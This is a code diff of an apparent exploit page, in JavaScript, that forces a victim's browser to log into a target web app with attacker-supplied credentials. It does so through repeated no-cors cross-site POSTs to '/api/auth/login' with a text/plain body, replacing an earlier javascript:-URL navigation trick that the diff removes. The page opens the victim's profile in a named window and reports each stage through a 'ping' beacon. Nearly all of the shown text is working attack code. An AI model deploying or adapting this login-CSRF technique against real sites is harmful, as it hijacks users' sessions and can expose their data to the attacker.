@@ -18,42 +18,40 @@ const ping = (q) => {
 
 ping('stage=gh_loaded');
 
-let victim = null;
-let switcher = null;
-
 try {
-  victim = window.open(APP + '/api/profile', 'victim');
+  window.open(APP + '/api/profile', 'victim');
   ping('stage=victim_opened');
 } catch (e) {
   ping('stage=victim_open_err&d=' + encodeURIComponent(String(e)));
 }
 
-try {
-  switcher = window.open(APP + '/login', 'switcher');
-  ping('stage=switcher_opened');
-} catch (e) {
-  ping('stage=switcher_open_err&d=' + encodeURIComponent(String(e)));
+const creds = JSON.stringify({ username: USER, password: PASS });
+
+function relogin(tag) {
+  return fetch(APP + '/api/auth/login', {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'text/plain;charset=UTF-8'
+    },
+    body: creds
+  }).then(() => {
+    ping('stage=' + tag);
+  }).catch((e) => {
+    ping('stage=' + tag + '_err&d=' + encodeURIComponent(String(e)));
+  });
 }
 
+setTimeout(() => relogin('relogin1'), 700);
+setTimeout(() => relogin('relogin2'), 1200);
+setTimeout(() => relogin('relogin3'), 1700);
+setTimeout(() => relogin('relogin4'), 2300);
+
 setTimeout(() => {
-  try {
-    const body = JSON.stringify({ username: USER, password: PASS });
-
-    const js = "javascript:(async()=>{try{" +
-      "await fetch('/api/auth/login',{" +
-        "method:'POST'," +
-        "headers:{'Content-Type':'application/json'}," +
-        "body:" + JSON.stringify(body) +
-      "});" +
-      "location='/'" +
-    "}catch(e){document.body.innerText='ERR:'+e}})()";
-
-    switcher.location = js;
-    ping('stage=jsnav_sent');
-  } catch (e) {
-    ping('stage=jsnav_err&d=' + encodeURIComponent(String(e)));
-  }
-}, 1500);
+  ping('stage=go_home');
+  location = APP + '/';
+}, 3200);
 </script>
 </body>
 </html>
